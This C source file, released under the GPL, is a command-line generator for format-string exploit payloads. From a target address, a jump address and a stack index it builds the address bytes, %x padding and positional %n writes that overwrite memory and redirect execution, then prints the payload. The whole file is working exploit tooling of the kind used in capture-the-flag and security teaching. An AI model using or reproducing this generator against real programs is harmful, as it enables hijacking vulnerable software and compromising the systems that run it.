/*
 * Copyright (C) 2014 Olivier Gayot
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#include <assert.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <sysexits.h>
#include <stdio.h>
#include <getopt.h>

unsigned char buffer[4096];

/* address to override */
static unsigned long override_addr_g;

/* address to jump to */
static unsigned long jmp_addr_g;

/* index of the element on the stack which is the beginning of the buffer */
static unsigned int idx_stack_g;

/* assume that an address is 'address_size_g' bytes long */
static int address_size_g = 4;

    __attribute__((noreturn))
static void usage(const char *arg0)
{
    fprintf(stderr, "usage: %s --override addr --with addr --stackidx idx\n", arg0);
    fprintf(stderr, "       %s --override addr --with addr --stackidx idx --addrsize size\n", arg0);

    exit(EX_USAGE);
}

/*
 * this function uses getopt to parse the options.
 * it returns 0 on success; otherwise it returns a negative number
 */
static int parse_arguments(int argc, char *argv[])
{
    bool override_set = false;
    bool stackidx_set = false;
    bool with_set = false;

    for (;;) {
	/* declaration of the options which we handle */
	enum {
	    OPT_OVERRIDE,
	    OPT_WITH,
	    OPT_STACKIDX,
	    OPT_ADDR_SIZE,
	};

	static struct option long_options[] = {
	    {"override", required_argument, 0, OPT_OVERRIDE},
	    {"with",     required_argument, 0, OPT_WITH},
	    {"stackidx", required_argument, 0, OPT_STACKIDX},
	    {"addrsize", required_argument, 0, OPT_ADDR_SIZE},
	};

	int option_index;
	int c = getopt_long(argc, argv, "", long_options, &option_index);

	if (c == -1) {
	    break;
	}

	switch (c) {
	    case OPT_OVERRIDE:
		override_addr_g = strtoul(optarg, NULL, 16);
		override_set = true;
		break;
	    case OPT_WITH:
		jmp_addr_g = strtoul(optarg, NULL, 16);
		with_set = true;
		break;
	    case OPT_STACKIDX:
		idx_stack_g = atoi(optarg);
		stackidx_set = true;
		break;
	    case OPT_ADDR_SIZE:
		address_size_g = atoi(optarg);

		if (address_size_g < 1 || address_size_g > 8) {
		    return -1;
		}

		break;
	    default:
		/*
		 * we must have accessed an option which we do not have
		 * specified in our switch-case
		 */

		assert (false);

		break;
	}
    }

    if (optind < argc) {
	return -1;
    }

    if (!override_set || !stackidx_set || !with_set) {
	return -1;
    }

    return 0;
}

/*
 * this function returns the number of remaining bytes to write in order to
 * have a %n printing the expected value
 */
static int calc_remaining(unsigned int needed, unsigned int *so_far)
{
    int ret;

    assert(needed <= 0xff);

    if (needed >= (*so_far % 0x100)) {
	ret = needed - (*so_far % 0x100);
    } else {
	ret = 0x100 - ((*so_far % 0x100) - needed);
    }

    *so_far += ret;

    return ret;
}

int main(int argc, char *argv[])
{
#define PUT_ADDR(_offset) \
    do { \
	typeof(override_addr_g) override_addr = override_addr_g + _offset * 0x10; \
	\
	for (int sh = 0; sh < address_size_g; ++sh) { \
	    for (int shift = 0; shift < address_size_g; ++shift) { \
		buffer[i++] = (override_addr >> (shift * 8)) & 0xff; \
		++written; \
	    } \
	    ++override_addr; \
	} \
    } while (0);

    unsigned int i = 0;
    unsigned int written = 0;
    unsigned int values_pop = 0;

    if (parse_arguments(argc, argv) < 0) {
	usage(argv[0]);
    }

    PUT_ADDR(0);

    /* override the address */
    for (int shift = 0; shift < address_size_g; ++shift) {
	int remaining;

	if ((remaining = calc_remaining((jmp_addr_g >> (shift * 8)) & 0xff, &written)) < 8) {
	    memcpy(buffer + i, "ffffffff", remaining);
	    i += remaining;
	} else {
	    i += sprintf((char *)buffer + i, "%%%dx", remaining);
	    ++values_pop;
	}

	if (values_pop == idx_stack_g) {
	    /* (very) unlikely */

	    i += sprintf((char *)buffer + i, "%%n");
	    ++values_pop;
	} else {
	    i += sprintf((char *)buffer + i, "%%%d$n", idx_stack_g);
	}

	++idx_stack_g;
    }

    /* we write our payload */
    fwrite(buffer, 1, i, stdout);

    return 0;

#undef PUT_ADDR
}